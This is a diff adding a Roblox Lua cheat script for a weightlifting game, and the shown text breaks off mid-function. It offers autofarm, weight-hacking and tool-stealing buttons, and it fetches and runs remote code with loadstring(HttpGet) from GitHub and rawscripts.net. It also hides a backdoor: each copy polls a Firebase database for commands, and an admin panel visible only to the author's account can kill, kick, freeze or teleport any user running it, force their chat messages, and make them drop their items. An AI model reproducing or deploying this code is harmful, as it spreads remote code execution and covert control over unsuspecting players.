@@ -1,0 +1,2268 @@
+local players = game:GetService("Players")
+local virtualInputManager = game:GetService("VirtualInputManager")
+local userInputService = game:GetService("UserInputService")
+local runService = game:GetService("RunService")
+local tweenService = game:GetService("TweenService")
+local replicatedStorage = game:GetService("ReplicatedStorage")
+local httpService = game:GetService("HttpService")
+local textChatService = game:GetService("TextChatService")
+local starterGui = game:GetService("StarterGui")
+
+if not _G.Settings then
+  _G.Settings = {
+    SpeedAndJump = false,
+    HackWeight = false,
+    SmallWeights = false,
+    AntiFling = false,
+    AntiSit = false,
+    InfiniteZoom = false,
+    Shiftlock = false,
+    HackCombat = false,
+  }
+end
+
+local localPlayer = players.LocalPlayer
+local name = localPlayer.Name
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BocusLuke/UI/main/STX/Module.Lua"))()
+local client = loadstring(game:HttpGet("https://raw.githubusercontent.com/BocusLuke/UI/main/STX/Client.Lua"))()
+
+local function f1(sender, description, p1)
+  client:Notify({ Title = sender, Description = description }, {
+    OutlineColor = Color3.fromRGB(80, 80, 80),
+    Time = p1 or 5,
+    Type = "default",
+  })
+end
+
+task.spawn(function() f1("follow me on Roblox plz", "made by GioBolqv1", 10) end)
+
+local customAutoFarmGui = Instance.new("ScreenGui")
+customAutoFarmGui.Name = "CustomAutoFarmGui"
+customAutoFarmGui.ResetOnSpawn = false
+customAutoFarmGui.Parent = localPlayer:WaitForChild("PlayerGui")
+
+local mainFrame = Instance.new("Frame")
+mainFrame.Name = "MainFrame"
+mainFrame.Size = UDim2.new(0, 160, 0, 220)
+mainFrame.Position = UDim2.new(0.65, 0, 0.5, -110)
+mainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+mainFrame.BorderSizePixel = 0
+mainFrame.Active = true
+mainFrame.Parent = customAutoFarmGui
+
+local uiCorner = Instance.new("UICorner")
+uiCorner.CornerRadius = UDim.new(0, 5)
+uiCorner.Parent = mainFrame
+
+local uiStroke = Instance.new("UIStroke")
+uiStroke.Thickness = 2
+uiStroke.Color = Color3.fromRGB(45, 45, 45)
+uiStroke.Parent = mainFrame
+
+local inputBegan = mainFrame.InputBegan
+local v1, position, position2
+
+inputBegan:Connect(function(p2)
+  if p2.UserInputType == Enum.UserInputType.Touch
+    or p2.UserInputType == Enum.UserInputType.MouseButton1 then
+    v1 = true
+    position = p2.Position
+    position2 = mainFrame.Position
+
+    p2.Changed:Connect(function()
+      if p2.UserInputState == Enum.UserInputState.End then
+        v1 = false
+      end
+    end)
+  end
+end)
+
+local inputChanged = mainFrame.InputChanged
+local v2
+
+inputChanged:Connect(function(p3)
+  if p3.UserInputType == Enum.UserInputType.Touch
+    or p3.UserInputType == Enum.UserInputType.MouseMovement then
+    v2 = p3
+  end
+end)
+
+userInputService.InputChanged:Connect(function(input)
+  if input == v2 and v1 then
+    local v3 = input.Position - position
+
+    mainFrame.Position = UDim2.new(
+      position2.X.Scale, position2.X.Offset + v3.X, position2.Y.Scale, position2.Y.Offset + v3.Y
+    )
+  end
+end)
+
+local gridContainer = Instance.new("Frame")
+gridContainer.Name = "GridContainer"
+gridContainer.Size = UDim2.new(1, 0, 0, 185)
+gridContainer.BackgroundTransparency = 1
+gridContainer.Parent = mainFrame
+
+local uiGridLayout = Instance.new("UIGridLayout")
+uiGridLayout.Parent = gridContainer
+uiGridLayout.CellPadding = UDim2.new(0, 5, 0, 5)
+uiGridLayout.CellSize = UDim2.new(0, 72, 0, 26)
+uiGridLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+uiGridLayout.VerticalAlignment = Enum.VerticalAlignment.Center
+uiGridLayout.SortOrder = Enum.SortOrder.LayoutOrder
+
+local function f2(textButton)
+  textButton.TextColor3 = Color3.fromRGB(220, 220, 220)
+  textButton.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+  textButton.TextScaled = true
+  textButton.Font = Enum.Font.Michroma
+
+  local uiCorner2 = Instance.new("UICorner")
+  uiCorner2.CornerRadius = UDim.new(0, 4)
+  uiCorner2.Parent = textButton
+
+  local uiStroke2 = Instance.new("UIStroke")
+  uiStroke2.Color = Color3.fromRGB(60, 60, 60)
+  uiStroke2.Parent = textButton
+end
+
+local textButton2 = Instance.new("TextButton")
+textButton2.Text = "WEIGHT"
+textButton2.LayoutOrder = 1
+textButton2.Parent = gridContainer
+
+f2(textButton2)
+
+local textButton3 = Instance.new("TextButton")
+textButton3.Text = "D-WEIGHT"
+textButton3.LayoutOrder = 2
+textButton3.Parent = gridContainer
+
+f2(textButton3)
+
+local textButton4 = Instance.new("TextButton")
+textButton4.Text = "T-WEIGHT"
+textButton4.LayoutOrder = 3
+textButton4.Parent = gridContainer
+
+f2(textButton4)
+
+local textButton5 = Instance.new("TextButton")
+textButton5.Text = "FARM WEIGHT"
+textButton5.LayoutOrder = 4
+textButton5.Parent = gridContainer
+
+f2(textButton5)
+
+local textButton6 = Instance.new("TextButton")
+textButton6.Text = "FARM D-WEIGHT"
+textButton6.LayoutOrder = 5
+textButton6.Parent = gridContainer
+
+f2(textButton6)
+
+local textButton7 = Instance.new("TextButton")
+textButton7.Text = "FARM T-WEIGHT"
+textButton7.LayoutOrder = 6
+textButton7.Parent = gridContainer
+
+f2(textButton7)
+
+local textButton8 = Instance.new("TextButton")
+textButton8.Text = "SAFE"
+textButton8.LayoutOrder = 7
+textButton8.Parent = gridContainer
+
+f2(textButton8)
+
+local textButton9 = Instance.new("TextButton")
+textButton9.Text = "M-NOOB"
+textButton9.LayoutOrder = 8
+textButton9.Parent = gridContainer
+
+f2(textButton9)
+
+local textButton10 = Instance.new("TextButton")
+textButton10.Text = "STEAL WEIGHTS"
+textButton10.LayoutOrder = 9
+textButton10.Parent = gridContainer
+
+f2(textButton10)
+
+local textButton11 = Instance.new("TextButton")
+textButton11.Text = "DROP"
+textButton11.LayoutOrder = 10
+textButton11.Parent = gridContainer
+
+f2(textButton11)
+
+local textButton12 = Instance.new("TextButton")
+textButton12.Text = "HACK WEIGHT"
+textButton12.LayoutOrder = 11
+textButton12.Parent = gridContainer
+
+f2(textButton12)
+
+local textButton13 = Instance.new("TextButton")
+textButton13.Text = "SMALL WEIGHTS"
+textButton13.LayoutOrder = 12
+textButton13.Parent = gridContainer
+
+f2(textButton13)
+
+local bottomContainer = Instance.new("Frame")
+bottomContainer.Name = "BottomContainer"
+bottomContainer.Size = UDim2.new(1, 0, 0, 30)
+bottomContainer.Position = UDim2.new(0, 0, 1, -30)
+bottomContainer.BackgroundTransparency = 1
+bottomContainer.Parent = mainFrame
+
+local uiListLayout = Instance.new("UIListLayout")
+uiListLayout.Parent = bottomContainer
+uiListLayout.FillDirection = Enum.FillDirection.Horizontal
+uiListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+uiListLayout.VerticalAlignment = Enum.VerticalAlignment.Center
+uiListLayout.Padding = UDim.new(0, 4)
+
+local textButton14 = Instance.new("TextButton")
+textButton14.Text = "SPEED & JUMP"
+textButton14.Size = UDim2.new(0, 72, 0, 24)
+textButton14.Parent = bottomContainer
+
+f2(textButton14)
+
+local textButton15 = Instance.new("TextButton")
+textButton15.Text = "HACK COMBAT"
+textButton15.Size = UDim2.new(0, 72, 0, 24)
+textButton15.Parent = bottomContainer
+
+f2(textButton15)
+
+local sidePanel = Instance.new("Frame")
+sidePanel.Name = "SidePanel"
+sidePanel.Size = UDim2.new(0, 85, 0, 155)
+sidePanel.Position = UDim2.new(0, -90, 0, 0)
+sidePanel.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+sidePanel.BorderSizePixel = 0
+sidePanel.Visible = false
+sidePanel.Parent = mainFrame
+
+Instance.new("UICorner", sidePanel).CornerRadius = UDim.new(0, 5)
+Instance.new("UIStroke", sidePanel).Color = Color3.fromRGB(50, 50, 50)
+
+local uiListLayout2 = Instance.new("UIListLayout")
+uiListLayout2.Parent = sidePanel
+uiListLayout2.Padding = UDim.new(0, 4)
+uiListLayout2.HorizontalAlignment = Enum.HorizontalAlignment.Center
+uiListLayout2.VerticalAlignment = Enum.VerticalAlignment.Center
+
+local function makeTextButton(text)
+  local textButton16 = Instance.new("TextButton")
+  textButton16.Size = UDim2.new(0, 75, 0, 24)
+  textButton16.Text = text
+
+  f2(textButton16)
+
+  textButton16.TextSize = 8
+  textButton16.Parent = sidePanel
+
+  return textButton16
+end
+
+local antiFLING = makeTextButton("ANTI FLING")
+local shiftlock = makeTextButton("SHIFTLOCK")
+local removeSTATUE = makeTextButton("REMOVE STATUE")
+local antiSIT = makeTextButton("ANTI SIT")
+local infiniteZOOM = makeTextButton("INFINITE ZOOM")
+
+local textButton17 = Instance.new("TextButton")
+textButton17.Size = UDim2.new(0, 30, 0, 22)
+textButton17.Position = UDim2.new(0, -5, 0, -25)
+textButton17.Text = "<-"
+textButton17.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+textButton17.TextColor3 = Color3.new(1, 1, 1)
+textButton17.ZIndex = 10
+textButton17.Parent = textButton2
+
+Instance.new("UICorner", textButton17).CornerRadius = UDim.new(0, 4)
+
+textButton17.MouseButton1Click:Connect(function()
+  sidePanel.Visible = not sidePanel.Visible
+  textButton17.Text = sidePanel.Visible and "->" or "<-"
+end)
+
+infiniteZOOM.MouseButton1Click:Connect(function() localPlayer.CameraMaxZoomDistance = 999999 end)
+local flag = false
+local flag2 = false
+local flag3 = false
+local list = {}
+
+antiFLING.MouseButton1Click:Connect(function()
+  flag = not flag
+
+  antiFLING.BackgroundColor3 = flag and Color3.fromRGB(40, 100, 40)
+    or Color3.fromRGB(10, 10, 10)
+end)
+
+local function f3(character, canCollide)
+  for _, value in pairs(character:GetChildren()) do
+    if value:IsA("BasePart") then
+      value.CanCollide = canCollide
+    end
+  end
+end
+
+runService.Stepped:Connect(function()
+  if flag then
+    for _, value2 in pairs(players:GetPlayers()) do
+      if value2 ~= localPlayer then
+        local character2 = value2.Character
+
+        if character2 then
+          f3(character2, false)
+        end
+      end
+    end
+  end
+end)
+
+shiftlock.MouseButton1Click:Connect(function()
+  loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Shiftlock-72866"))()
+end)
+
+local mouseButton1Click = removeSTATUE.MouseButton1Click
+local instance
+
+mouseButton1Click:Connect(function()
+  flag3 = not flag3
+
+  removeSTATUE.BackgroundColor3 = flag3 and Color3.fromRGB(40, 100, 40)
+    or Color3.fromRGB(10, 10, 10)
+
+  local noobStatue = workspace:FindFirstChild("NoobStatue")
+
+  if flag3 then
+    if noobStatue then
+      instance = noobStatue
+      noobStatue.Parent = nil
+    end
+  elseif instance then
+    instance.Parent = workspace
+  end
+end)
+
+antiSIT.MouseButton1Click:Connect(function()
+  flag2 = not flag2
+  antiSIT.BackgroundColor3 = flag2 and Color3.fromRGB(40, 100, 40) or Color3.fromRGB(10, 10, 10)
+  local uselessMachines = workspace.Map:FindFirstChild("Useless Machines")
+
+  if flag2 then
+    if uselessMachines then
+      for _, value3 in pairs(uselessMachines:GetDescendants()) do
+        if value3:IsA("Seat") or value3:IsA("VehicleSeat") then
+          table.insert(list, { instance = value3, originalParent = value3.Parent })
+          value3.Parent = nil
+        end
+      end
+    end
+  else
+    for _, value4 in pairs(list) do
+      if value4.instance then
+        value4.instance.Parent = value4.originalParent
+      end
+    end
+
+    list = {}
+  end
+end)
+
+local name2 = ""
+local flag4 = false
+local flag5 = false
+local f4
+
+local function f5(text2, p4)
+  local gsub = text2:lower():gsub("%s+", "")
+  print("sending " .. p4 .. " to " .. gsub)
+
+  local url = "https://roblox-admin-muscle-simulator-default-rtdb.europe-west1.firebasedatabase.app/"
+    .. "commands/" .. gsub .. ".json"
+
+  local v4 = { action = p4, sender = name, time = os.time() }
+
+  if p4 == "tp" then
+    local character3 = localPlayer.Character
+    local humanoidRootPart = character3 and character3:FindFirstChild("HumanoidRootPart")
+
+    if humanoidRootPart then
+      local cframe = humanoidRootPart.CFrame
+      local rx, ry, rz = cframe:ToEulerAnglesXYZ()
+      v4.pos = { cframe.X, cframe.Y, cframe.Z, rx, ry, rz }
+    end
+  end
+
+  task.spawn(function()
+    if f4({
+      Url = url,
+      Method = "PUT",
+      Headers = { ["Content-Type"] = "application/json" },
+      Body = httpService:JSONEncode(v4),
+    }) then
+      print("response: 200")
+    else
+      print("response: FAIL")
+    end
+  end)
+end
+
+function f4(p5)
+  local v5 = request or http_request or http and http.request or syn.request
+
+  if v5 then
+    local ok, result = pcall(function() return v5(p5) end)
+    return ok and result or nil
+  end
+
+  local ok2, result2 = pcall(function() return httpService:RequestAsync(p5) end)
+  return ok2 and result2 or nil
+end
+
+local cframe2, loadAnimation
+
+task.spawn(function()
+  local gsub2 = name:lower():gsub("%s+", "")
+
+  while true do
+    task.wait(0.25)
+
+    local url2 = "https://roblox-admin-muscle-simulator-default-rtdb.europe-west1.firebasedatabase.app/"
+      .. "commands/" .. gsub2 .. ".json"
+
+    local v6 = f4({ Url = url2, Method = "GET" })
+
+    if v6 and v6.Body and v6.Body ~= "null" then
+      local jsonDecode = httpService:JSONDecode(v6.Body)
+
+      if jsonDecode and jsonDecode.action then
+        print("[ADMIN RESPONSE] Action Received: " .. tostring(jsonDecode.action) .. " | From: "
+          .. tostring(jsonDecode.sender))
+
+        if jsonDecode.action == "kill" then
+          if localPlayer.Character then
+            localPlayer.Character:BreakJoints()
+          end
+        elseif jsonDecode.action == "kick" then
+          localPlayer:Kick("Kicked by Admin: " .. tostring(jsonDecode.sender))
+        elseif jsonDecode.action == "expose" then
+          if not pcall(function()
+            if textChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+              textChatService.TextChannels.RBXGeneral:SendAsync("I am so lonely..")
+            else
+              replicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
+                "I am so lonely..", "All"
+              )
+            end
+          end) then
+            f5(jsonDecode.sender, "expose_notify")
+          end
+        elseif jsonDecode.action == "expose_notify" then
+          f1(jsonDecode.sender, "couldn't say it (restricted)", 3)
+        elseif jsonDecode.action == "droptools" then
+          if localPlayer.Character then
+            for _, value5 in pairs(localPlayer.Character:GetChildren()) do
+              if value5:IsA("Tool") and value5.Name ~= "Combat" then
+                value5.Parent = workspace
+              end
+            end
+
+            if localPlayer:FindFirstChild("Backpack") then
+              for _, value6 in pairs(localPlayer.Backpack:GetChildren()) do
+                if value6:IsA("Tool") and value6.Name ~= "Combat" then
+                  value6.Parent = localPlayer.Character
+                  task.wait()
+                  value6.Parent = workspace
+                end
+              end
+            end
+          end
+        elseif jsonDecode.action == "tp" then
+          if jsonDecode.pos and typeof(jsonDecode.pos) == "table" and localPlayer.Character then
+            local humanoidRootPart2 = localPlayer.Character:FindFirstChild("HumanoidRootPart")
+
+            if humanoidRootPart2 then
+              local v7, v8, v9, v10, v11, v12 = unpack(jsonDecode.pos)
+
+              humanoidRootPart2.CFrame = CFrame.new(v7, v8, v9) * CFrame.Angles(v10, v11, v12)
+                * CFrame.new(0, 2, -5)
+            end
+          else
+            task.spawn(function()
+              local sender2 = jsonDecode.sender
+              local humanoidRootPart3, humanoidRootPart4
+
+              for i = 1, 10 do
+                local findFirstChild = players:FindFirstChild(sender2)
+
+                if findFirstChild and findFirstChild.Character and localPlayer.Character then
+                  humanoidRootPart4 = findFirstChild.Character:FindFirstChild("HumanoidRootPart")
+                  humanoidRootPart3 = localPlayer.Character:FindFirstChild("HumanoidRootPart")
+
+                  if humanoidRootPart4 and humanoidRootPart3 then
+                    break
+                  end
+                end
+
+                task.wait(0.2)
+              end
+
+              if humanoidRootPart4 and humanoidRootPart3 then
+                humanoidRootPart3.CFrame = humanoidRootPart4.CFrame * CFrame.new(0, 2, -5)
+              end
+            end)
+          end
+        elseif jsonDecode.action == "dance" then
+          pcall(function()
+            local character4 = localPlayer.Character
+            local humanoid = character4 and character4:FindFirstChildOfClass("Humanoid")
+
+            if humanoid then
+              local animator = humanoid:FindFirstChildOfClass("Animator")
+                or Instance.new("Animator", humanoid)
+
+              for _, value7 in pairs(animator:GetPlayingAnimationTracks()) do
+                value7:Stop()
+              end
+
+              local animation = Instance.new("Animation")
+              animation.AnimationId = "rbxassetid://82682811348660"
+              animation.Parent = workspace
+
+              loadAnimation = animator:LoadAnimation(animation)
+              loadAnimation.Priority = Enum.AnimationPriority.Action4
+              loadAnimation.Looped = true
+              loadAnimation:Play()
+            end
+          end)
+
+          flag4 = true
+          flag5 = false
+        elseif jsonDecode.action == "undance" then
+          flag4 = false
+
+          if loadAnimation then
+            loadAnimation:Stop()
+            loadAnimation:Destroy()
+            loadAnimation = nil
+          end
+
+          local character5 = localPlayer.Character
+
+          local humanoid2 = character5
+          humanoid2 = character5 and character5:FindFirstChildOfClass("Humanoid")
+
+          if humanoid2 then
+            local animator2 = humanoid2:FindFirstChildOfClass("Animator")
+
+            if animator2 then
+              for _, value8 in pairs(animator2:GetPlayingAnimationTracks()) do
+                value8:Stop()
+              end
+            end
+          end
+        elseif jsonDecode.action == "freeze" then
+          flag5 = true
+          flag4 = false
+
+          if localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart") then
+            cframe2 = localPlayer.Character.HumanoidRootPart.CFrame
+          end
+
+          if textChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+            textChatService.TextChannels.RBXGeneral:SendAsync("crap I'm frozen")
+          else
+            replicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
+              "crap I'm frozen", "All"
+            )
+          end
+        elseif jsonDecode.action == "unfreeze" then
+          flag5 = false
+          cframe2 = nil
+        end
+
+        f4({ Url = url2, Method = "DELETE" })
+      end
+    end
+  end
+end)
+
+runService.Stepped:Connect(function()
+  local character6 = localPlayer.Character
+
+  if not character6 then
+    return
+  end
+
+  local humanoidRootPart5 = character6:FindFirstChild("HumanoidRootPart")
+  local humanoid3 = character6:FindFirstChildOfClass("Humanoid")
+
+  if flag5 and humanoidRootPart5 then
+    humanoidRootPart5.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
+    humanoidRootPart5.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
+    humanoidRootPart5.Velocity = Vector3.new(0, 0, 0)
+    humanoidRootPart5.RotVelocity = Vector3.new(0, 0, 0)
+
+    if humanoid3 then
+      humanoid3.WalkSpeed = 0
+      humanoid3.JumpPower = 0
+      humanoid3:ChangeState(Enum.HumanoidStateType.Physics)
+    end
+
+    if cframe2 then
+      humanoidRootPart5.CFrame = cframe2
+    end
+  end
+end)
+
+local adminPanel, pullUp, pullDown, textBox, frame, v13, v14, v15, v16, v17, v18, v19, v20
+
+if localPlayer.Name == "GioBolqv1" then
+  adminPanel = Instance.new("Frame")
+  adminPanel.Name = "AdminPanel"
+  adminPanel.Size = UDim2.new(0, 160, 0, 190)
+  adminPanel.Position = UDim2.new(-1, -2, 0, 0)
+  adminPanel.BackgroundColor3 = Color3.fromRGB(25, 5, 5)
+  adminPanel.BorderSizePixel = 0
+  adminPanel.ZIndex = 5
+  adminPanel.Visible = false
+  adminPanel.ClipsDescendants = true
+  adminPanel.Parent = mainFrame
+
+  local uiCorner3 = Instance.new("UICorner")
+  uiCorner3.CornerRadius = UDim.new(0, 5)
+  uiCorner3.Parent = adminPanel
+
+  local uiStroke3 = Instance.new("UIStroke")
+  uiStroke3.Thickness = 2
+  uiStroke3.Color = Color3.fromRGB(50, 15, 15)
+  uiStroke3.Parent = adminPanel
+
+  pullUp = Instance.new("TextButton")
+  pullUp.Name = "PullUp"
+  pullUp.Size = UDim2.new(0, 30, 0, 22)
+  pullUp.Position = UDim2.new(0, -45, 0, 93)
+  pullUp.Text = "<-"
+  pullUp.ZIndex = 20
+  pullUp.TextColor3 = Color3.new(1, 1, 1)
+  pullUp.BackgroundColor3 = Color3.fromRGB(25, 5, 5)
+  pullUp.BorderSizePixel = 0
+  pullUp.Parent = textButton11
+
+  Instance.new("UICorner", pullUp).CornerRadius = UDim.new(0, 4)
+
+  pullDown = Instance.new("TextButton")
+  pullDown.Name = "PullDown"
+  pullDown.Size = UDim2.new(0, 30, 0, 22)
+  pullDown.Position = UDim2.new(0, -45, 0, 93)
+  pullDown.Text = "->"
+  pullDown.ZIndex = 20
+  pullDown.TextColor3 = Color3.new(1, 1, 1)
+  pullDown.BackgroundColor3 = Color3.fromRGB(25, 5, 5)
+  pullDown.BorderSizePixel = 0
+  pullDown.Visible = false
+  pullDown.Parent = textButton11
+
+  Instance.new("UICorner", pullDown).CornerRadius = UDim.new(0, 4)
+
+  pullUp.MouseButton1Click:Connect(function()
+    adminPanel.Visible = true
+    pullUp.Visible = false
+    pullDown.Visible = true
+  end)
+
+  pullDown.MouseButton1Click:Connect(function()
+    adminPanel.Visible = false
+    pullUp.Visible = true
+    pullDown.Visible = false
+  end)
+
+  local frame2 = Instance.new("Frame")
+  frame2.Size = UDim2.new(1, -16, 0, 22)
+  frame2.Position = UDim2.new(0, 8, 0, 8)
+  frame2.BackgroundTransparency = 1
+  frame2.Parent = adminPanel
+
+  textBox = Instance.new("TextBox")
+  textBox.Size = UDim2.new(0.65, 0, 1, 0)
+  textBox.PlaceholderText = "Target..."
+  textBox.Text = ""
+  textBox.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+  textBox.TextColor3 = Color3.new(1, 1, 1)
+  textBox.Font = Enum.Font.Michroma
+  textBox.TextSize = 10
+  textBox.ZIndex = 10
+  textBox.Parent = frame2
+
+  Instance.new("UICorner", textBox).CornerRadius = UDim.new(0, 4)
+  Instance.new("UIStroke", textBox).Color = Color3.fromRGB(70, 30, 30)
+
+  local textButton18 = Instance.new("TextButton")
+  textButton18.Size = UDim2.new(0.32, 0, 1, 0)
+  textButton18.Position = UDim2.new(0.68, 0, 0, 0)
+  textButton18.Text = "EXPOSE"
+
+  f2(textButton18)
+
+  textButton18.BackgroundColor3 = Color3.fromRGB(20, 10, 10)
+  textButton18.TextSize = 8
+  textButton18.ZIndex = 10
+  textButton18.Parent = frame2
+
+  textButton18.MouseButton1Click:Connect(function()
+    for _, value9 in pairs(players:GetPlayers()) do
+      if value9 ~= localPlayer then
+        f5(value9.Name, "expose")
+      end
+    end
+  end)
+
+  frame = Instance.new("Frame")
+  frame.Size = UDim2.new(1, 0, 0, 150)
+  frame.Position = UDim2.new(0, 0, 0, 35)
+  frame.BackgroundTransparency = 1
+  frame.Parent = adminPanel
+
+  local uiGridLayout2 = Instance.new("UIGridLayout")
+  uiGridLayout2.Parent = frame
+  uiGridLayout2.CellPadding = UDim2.new(0, 5, 0, 5)
+  uiGridLayout2.CellSize = UDim2.new(0, 72, 0, 20)
+  uiGridLayout2.HorizontalAlignment = Enum.HorizontalAlignment.Center
+  uiGridLayout2.SortOrder = Enum.SortOrder.LayoutOrder
+
+  local function makeTextButton2(text3, layoutOrder)
+    local textButton19 = Instance.new("TextButton")
+    textButton19.Text = text3
+    textButton19.LayoutOrder = layoutOrder
+    textButton19.ZIndex = 10
+    textButton19.Parent = frame
+
+    f2(textButton19)
+    return textButton19
+  end
+
+  local textButton20 = makeTextButton2("KILL", 1)
+  local textButton21 = makeTextButton2("KILL ALL", 2)
+  local textButton22 = makeTextButton2("KICK", 3)
+  local textButton23 = makeTextButton2("KICK ALL", 4)
+  v13 = makeTextButton2("FREEZE", 5)
+  v14 = makeTextButton2("FREEZE ALL", 6)
+  v15 = makeTextButton2("DANCE", 7)
+  v16 = makeTextButton2("DANCE ALL", 8)
+  local textButton24 = makeTextButton2("TP TO ME", 9)
+  local textButton25 = makeTextButton2("TP ALL", 10)
+  local textButton26 = makeTextButton2("DROP TOOLS", 11)
+  local textButton27 = makeTextButton2("DROP TOOLS ALL", 12)
+  v17 = {}
+  v18 = {}
+  v19 = false
+  v20 = false
+
+  textBox.FocusLost:Connect(function()
+    local gsub3 = textBox.Text:lower():gsub("%s+", "")
+
+    if gsub3 == "" then
+      name2 = ""
+      return
+    end
+
+    for _, value10 in pairs(players:GetPlayers()) do
+      if value10 ~= localPlayer
+        and (value10.Name:lower():sub(1, #gsub3) == gsub3
+          or value10.DisplayName:lower():sub(1, #gsub3) == gsub3) then
+        name2 = value10.Name
+        textBox.Text = value10.DisplayName
+        break
+      end
+    end
+  end)
+
+  v13.MouseButton1Click:Connect(function()
+    if name2 ~= "" then
+      local v21 = not (v18[name2] or false)
+      v18[name2] = v21
+
+      if v21 then
+        f5(name2, "freeze")
+        v13.Text = "UNFREEZE"
+        v13.BackgroundColor3 = Color3.fromRGB(40, 100, 40)
+      else
+        f5(name2, "unfreeze")
+        v13.Text = "FREEZE"
+        v13.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+      end
+    end
+  end)
+
+  v15.MouseButton1Click:Connect(function()
+    if name2 ~= "" then
+      local v22 = not (v17[name2] or false)
+      v17[name2] = v22
+
+      if v22 then
+        f5(name2, "dance")
+        v15.Text = "UNDANCE"
+        v15.BackgroundColor3 = Color3.fromRGB(40, 100, 40)
+      else
+        f5(name2, "undance")
+        v15.Text = "DANCE"
+        v15.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+      end
+    end
+  end)
+
+  v16.MouseButton1Click:Connect(function()
+    v19 = not v19
+
+    v16.Text = v19 and "UNDANCE ALL" or "DANCE ALL"
+    v16.BackgroundColor3 = v19 and Color3.fromRGB(40, 100, 40) or Color3.fromRGB(10, 10, 10)
+
+    local v23 = v19 and "dance" or "undance"
+
+    for _, value11 in pairs(players:GetPlayers()) do
+      if value11 ~= localPlayer then
+        f5(value11.Name, v23)
+      end
+    end
+  end)
+
+  v14.MouseButton1Click:Connect(function()
+    v20 = not v20
+
+    v14.Text = v20 and "UNFREEZE ALL" or "FREEZE ALL"
+    v14.BackgroundColor3 = v20 and Color3.fromRGB(40, 100, 40) or Color3.fromRGB(10, 10, 10)
+
+    local v24 = v20 and "freeze" or "unfreeze"
+
+    for _, value12 in pairs(players:GetPlayers()) do
+      if value12 ~= localPlayer then
+        f5(value12.Name, v24)
+      end
+    end
+  end)
+
+  textButton24.MouseButton1Click:Connect(function()
+    if name2 ~= "" then
+      f5(name2, "tp")
+    end
+  end)
+
+  textButton25.MouseButton1Click:Connect(function()
+    for _, value13 in pairs(players:GetPlayers()) do
+      if value13 ~= localPlayer then
+        f5(value13.Name, "tp")
+      end
+    end
+  end)
+
+  textButton20.MouseButton1Click:Connect(function()
+    if name2 ~= "" then
+      f5(name2, "kill")
+    end
+  end)
+
+  textButton21.MouseButton1Click:Connect(function()
+    for _, value14 in pairs(players:GetPlayers()) do
+      if value14 ~= localPlayer then
+        f5(value14.Name, "kill")
+      end
+    end
+  end)
+
+  textButton22.MouseButton1Click:Connect(function()
+    if name2 ~= "" then
+      f5(name2, "kick")
+    end
+  end)
+
+  textButton23.MouseButton1Click:Connect(function()
+    for _, value15 in pairs(players:GetPlayers()) do
+      if value15 ~= localPlayer then
+        f5(value15.Name, "kick")
+      end
+    end
+  end)
+
+  textButton26.MouseButton1Click:Connect(function()
+    if name2 ~= "" then
+      f5(name2, "droptools")
+    end
+  end)
+
+  textButton27.MouseButton1Click:Connect(function()
+    for _, value16 in pairs(players:GetPlayers()) do
+      if value16 ~= localPlayer then
+        f5(value16.Name, "droptools")
+      end
+    end
+  end)
+end
+
+local flag6 = false
+local flag7 = false
+local flag8 = false
+local flag9 = false
+local list2 = {}
+local highest = 1
+
+local combatMagazine = Instance.new("Folder")
+combatMagazine.Name = "CombatMagazine"
+
+local v25 = game
+local getService = v25.GetService
+local backpack
+
+local function f6()
+  for j = #list2, 1, -1 do
+    local instance2 = list2[j]
+
+    if not instance2 or not instance2.Parent then
+      if instance2 and backpack then
+        pcall(function() instance2.Parent = backpack end)
+      end
+
+      if not instance2 or not instance2.Parent then
+        table.remove(list2, j)
+
+        if highest > #list2 then
+          highest = math.max(1, #list2)
+        end
+      end
+    end
+  end
+end
+
+combatMagazine.Parent = getService(v25, "ReplicatedStorage")
+
+local function f7(child, backpack2)
+  if not child then
+    return
+  end
+
+  local flag10 = false
+
+  for _, value17 in ipairs(list2) do
+    if value17 == child then
+      flag10 = true
+      break
+    end
+  end
+
+  if not flag10 then
+    if backpack2 then
+      child.Parent = backpack2
+    else
+      child.Parent = combatMagazine
+    end
+
+    table.insert(list2, child)
+  end
+end
+
+local function f8(character7)
+  if not character7 then
+    return nil
+  end
+
+  for _, value18 in ipairs(character7:GetChildren()) do
+    if value18:IsA("Tool") and value18.Name == "Combat" then
+      return value18
+    end
+  end
+
+  return nil
+end
+
+local function getCombat(backpack3)
+  if not backpack3 then
+    return nil
+  end
+
+  return backpack3:FindFirstChild("Combat")
+end
+
+local function f9()
+  for _, value19 in ipairs(players:GetPlayers()) do
+    if value19 ~= localPlayer then
+      local function f10(instance3)
+        if not instance3 then
+          return
+        end
+
+        for _, value20 in ipairs(instance3:GetChildren()) do
+          if value20:IsA("Tool") and value20.Name == "Combat" then
+            f7(value20, backpack)
+          end
+        end
+      end
+
+      f10(value19:FindFirstChild("Backpack"))
+      f10(value19.Character)
+    end
+  end
+end
+
+local function f11(p6)
+  p6:Deactivate()
+  task.wait()
+  p6:Activate()
+end
+
+local f12
+local instance4, humanoid4, connect
+
+local function f13()
+  if not flag9 or not humanoid4 or humanoid4.Health <= 0 or flag7 then
+    return
+  end
+
+  local character8 = localPlayer.Character
+
+  if not character8 then
+    return
+  end
+
+  local v26 = f8(character8)
+
+  if v26 and instance4 == v26 and connect then
+    return
+  end
+
+  if v26 then
+    f12(v26)
+    return
+  end
+
+  local combat = getCombat(backpack)
+
+  if combat then
+    humanoid4:EquipTool(combat)
+    f12(combat)
+    return
+  end
+
+  f6()
+
+  if #list2 > 0 then
+    local instance5 = list2[highest] or list2[1]
+    instance5.Parent = backpack
+
+    humanoid4:EquipTool(instance5)
+    f12(instance5)
+  end
+end
+
+function f12(instance6)
+  if connect then
+    connect:Disconnect()
+    connect = nil
+  end
